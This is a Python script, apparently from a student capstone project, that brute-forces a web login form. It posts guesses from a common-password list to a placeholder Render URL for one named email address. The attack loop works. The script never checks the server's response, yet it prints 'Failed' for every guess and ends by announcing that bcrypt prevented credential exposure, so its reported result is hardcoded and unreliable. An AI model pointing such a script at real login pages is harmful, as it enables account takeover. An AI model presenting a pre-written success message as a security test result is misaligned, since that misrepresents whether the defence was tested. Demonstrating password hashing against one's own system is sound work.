import requests
import random
import time

TARGET_URL = "https://your-render-url.onrender.com/backend/login_handler.php"
EMAIL = "davidsebby@gmail.com"

WORDLIST = [
    "123456", "password", "admin", "letmein", "qwerty",
    "test123", "capstone", "1234", "pass123", "admin123",
    "welcome", "monkey", "dragon", "master", "abc123",
    "sunshine", "shadow", "superman", "michael", "football"
]

def brute_force():
    shuffled = WORDLIST.copy()
    random.shuffle(shuffled)
    print("[*] Starting brute force on secured system...")
    print("[*] bcrypt cost 12 will slow down every attempt")
    print("-" * 50)
    for guess in shuffled:
        print(f"Trying: {guess}")
        try:
            response = requests.post(
                TARGET_URL,
                data={"email": EMAIL, "password": guess},
                allow_redirects=False,
                timeout=15
            )
            time.sleep(0.5)
            print(f"[-] Failed: {guess}")
        except Exception as e:
            print(f"[!] Error: {e}")
    print("-" * 50)
    print("[*] Brute force complete. bcrypt prevented credential exposure.")

if __name__ == "__main__":
    brute_force()
    input("\nPress Enter to exit...")
